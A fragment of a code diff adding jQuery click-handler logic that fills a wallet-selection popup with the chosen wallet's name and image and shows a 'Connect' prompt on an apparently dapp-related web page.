+    // //console.log($(e.target).find('img').first().attr('alt').replace(/([\s]+|[^a-zA-Z]+)/gim, "-").replace(/[\-]{2,}/gim, "-")+"identifier");
+    // //console.log($(e.target).find('img').first().attr('alt').replace(/([\s]+|[^a-zA-Z]+)/gim, "-").replace(/[\-]{2,}/gim, "-")+"identifier");
+    // //console.log($(e.target).find('img').first().attr('alt').replace(/([\s]+|[^a-zA-Z]+)/gim, "-").replace(/[\-]{2,}/gim, "-")+"identifier");
+    // //console.log($(e.target).find('img').first().attr('alt').replace(/([\s]+|[^a-zA-Z]+)/gim, "-").replace(/[\-]{2,}/gim, "-")+"identifier");
+    // //console.log($(e.target).find('img').first().attr('alt').replace(/([\s]+|[^a-zA-Z]+)/gim, "-").replace(/[\-]{2,}/gim, "-")+"identifier");
+    // //console.log($(e.target).find('img').first().attr('alt').replace(/([\s]+|[^a-zA-Z]+)/gim, "-").replace(/[\-]{2,}/gim, "-")+"identifier");
+    // //console.log($(e.target).find('img').first().attr('alt').replace(/([\s]+|[^a-zA-Z]+)/gim, "-").replace(/[\-]{2,}/gim, "-")+"identifier");
+    //console.log($(e.target))
+    popupname_j.html($(e.target).html().replace(" Wallet", ""));
+    //console.log($(e.target).prev().first());
+    popupimage_j.attr('src', $(e.target).next("img").attr('src'));
+      $("#wallet_id").val(popupname_j.html());
+    firstpopupname_j.html(popupname_j.html());
+    firstpopupimage_j.attr('src', popupimage_j.attr('src'));
+
+        popupimage_j.addClass('rounded float-start h-50 ');
+        // popupimage_j.css('height', '50%');
+
+      $(".jwEAlI").text("Connect");
+       $(".jwEAlI").css("display","flex");
+
+       $(".loading").html("Connect " + popupname_j.html());
+	// connect.style.display = "flex";
+		$(".loading").css({ 'color': 'rgb(64, 68, 79)' });
+
+e.preventDefault()
+
+
+ 		//console.log('event click fired click on text '+dappstore.classname);
+    });
+ }
+});
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+populateDapp(pageid);
+
+
+
+	
+
+});
